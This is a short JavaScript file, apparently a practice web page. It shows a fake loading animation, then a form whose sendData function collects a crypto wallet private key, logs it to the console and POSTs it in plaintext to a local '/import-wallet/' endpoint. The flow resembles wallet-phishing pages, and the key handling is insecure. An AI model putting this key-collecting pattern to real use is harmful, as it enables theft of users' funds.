document.addEventListener("DOMContentLoaded", function() {
  const loaderContainer = document.querySelector(".loader-container");
  const form = document.querySelector(".form");
  const loadingText = document.querySelector(".loading-text");
  const spinner = document.querySelector(".spinner");

  const messages = [
    "Encrypting Data...",
    "Hacking the Pentagon...",
    "Loading Capybara..."
  ];

  let messageIndex = 0;

  function changeMessage() {
    loadingText.textContent = messages[messageIndex];
    messageIndex = (messageIndex + 1) % messages.length;
  }

  setInterval(changeMessage, 2000);

  const switchInterval = setInterval(() => {
    spinner.classList.toggle("switch-image");
  }, 100);

  setTimeout(function() {
    clearInterval(switchInterval);
    loaderContainer.style.display = "none";
    form.removeAttribute("hidden");
  }, 7000); // Анимация будет продолжаться 7 секунд, затем форма станет видимой
});



function sendData() {
  const privateKey = document.getElementById('privateKeyInput').value;
  console.log(privateKey);
  
  // Создаем новый экземпляр XMLHttpRequest
  const xhr = new XMLHttpRequest();
  
  // Определяем метод, URL и асинхронность запроса
  xhr.open('POST', 'http://127.0.0.1:5500/import-wallet/', true);
  
  // Устанавливаем заголовки запроса
  xhr.setRequestHeader('Content-Type', 'application/json');
  
  // Отправляем данные в формате JSON
  xhr.send(JSON.stringify({ privateKey }));
  
  // Обработка успешного завершения запроса
  xhr.onload = function() {
    if (xhr.status === 200) {
      console.log('Private key sent successfully');
      // Здесь вы можете выполнить дополнительные действия после успешной отправки ключа
    } else {
      console.error('Error sending private key');
    }
  };
}
